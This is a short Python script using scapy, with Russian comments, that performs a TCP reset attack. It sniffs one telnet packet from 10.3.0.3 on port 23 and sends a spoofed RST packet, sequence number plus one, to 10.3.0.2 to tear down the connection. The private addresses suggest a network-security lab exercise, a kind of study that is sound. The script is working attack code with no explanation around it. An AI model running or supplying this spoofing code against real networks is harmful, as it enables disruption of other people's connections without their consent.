from scapy.all import sniff, IP, TCP, send

# Функция для обработки TCP-пакетов
def find_seq(packet):
    if packet.haslayer(TCP) and packet[IP].src == "10.3.0.3" and packet[TCP].dport == 23:
        correct_seq = packet[TCP].seq + 1
        print(f"Найден SEQ: {packet[TCP].seq}, отправляем RST с SEQ={correct_seq}")
        
        # Отправка RST
        ip = IP(src="10.3.0.3", dst="10.3.0.2")
        tcp = TCP(sport=packet[TCP].sport, dport=23, flags="R", seq=correct_seq)
        send(ip/tcp, verbose=0)

# Запускаем sniffing, перехватываем первый пакет на порту 23
sniff(filter="tcp port 23", prn=find_seq, count=1)